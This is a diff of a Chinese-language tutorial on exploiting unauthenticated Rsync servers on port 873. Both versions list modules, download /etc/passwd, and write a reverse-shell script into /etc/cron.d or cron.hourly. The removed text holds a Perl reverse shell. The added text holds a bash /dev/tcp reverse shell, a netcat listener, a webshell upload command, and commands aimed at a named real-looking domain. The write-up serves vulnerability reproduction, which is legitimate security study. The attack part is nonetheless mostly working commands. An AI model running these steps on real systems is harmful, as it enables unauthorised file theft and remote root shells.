@@ -1,67 +1,63 @@
-# Rsync 未授权访问漏洞
+Rsync 未授权访问漏洞
+====================
 
-## 漏洞描述
+一、漏洞简介
+------------
 
-Rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。
+rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。
 
-## 环境搭建
+**rsync的常用命令**
 
-Vulhub编译及运行Rsync服务器：
+    列举整个同步目录或指定目录：
+    rsync ip::
+    rsync ip::xxx/
+    下载文件或目录到本地：
+    rsync -avz ip::xxx/xx.php /root
+    rsync -avz ip::xxx/ /var/tmp
+    上传文件到服务器：
+    rsync -avz webshell.php ip::web/
 
-```
-docker-compose build
-docker-compose up -d
-```
+二、漏洞影响
+------------
 
-环境启动后，可以使用Rsync命令访问：
+三、复现过程
+------------
 
-```
-rsync rsync://your-ip:873/
-```
+`nmap`先扫一波：![1.png](./resource/Rsync未授权访问漏洞/media/rId24.png)
 
-![image-20220303133847165](./images/202203031338267.png)
+    rsync rsync://www.0-sec.org:873/
+    rsync rsync://www.0-sec.org:873/src 来查看模块名列表
+    我们再列出src模块下的文件
+    rsync rsync://www.0-sec.org:873/src/
 
-> 若Vulhub环境启动时报错`standard_init_linux.go:211: exec user process caused "no such file or directory"`，执行命令 `dos2unix docker-entrypoint.sh`，即可成功启动。
+![2.png](./resource/Rsync未授权访问漏洞/media/rId25.png)
 
-## 漏洞复现
+    我们可以下载任意文件：
+    rsync -av rsync://www.0-sec.org:873/src/etc/passwd ./
 
-访问建立后，可以查看模块名列表，有一个src模块，我们再列出这个模块下的文件：
+![3.png](./resource/Rsync未授权访问漏洞/media/rId26.png)
 
-```
-rsync rsync://your-ip:873/src/
-```
+**提权：**
 
-这是一个Linux根目录，我们可以下载任意文件：
+写入`shell`并赋权：
 
-```
-rsync -av rsync://your-ip:873/src/etc/passwd ./
-```
+    #!/bin/bash 
+    /bin/bash -i >& /dev/tcp/192.168.91.128/4444 0>&1
 
-或者写入任意文件：
+    chmod +x shell
 
-```
-rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
-```
+将`shell`上传至`/etc/cron.hourly`：
 
-### 反弹shell
+    rsync -av shell rsync://192.168.91.130/src/etc/cron.hourly
+    rsync -av shell rsync://www.0-sec.org:873/src/etc/cron.d/shell
 
-写入cron任务反弹shell。
+![4.png](./resource/Rsync未授权访问漏洞/media/rId27.png)
 
-shell文件内容如下：
+本地监听：
 
-```
-# 此处指定用户root不可省略
-* * * * * root perl -e 'use Socket;$i="192.168.174.128";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+    nc -nvv -lp 4444
 
-```
+参考链接
+--------
 
-上传shell文件触发反弹shell：
-
-```
-rsync -av shell rsync://192.168.174.128:873/src/etc/cron.d/shell
-```
-
-![image-20220303140727513](./images/202203031407618.png)
-
-
-
+> https://fansonfan.github.io/2019/04/20/rsync-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/
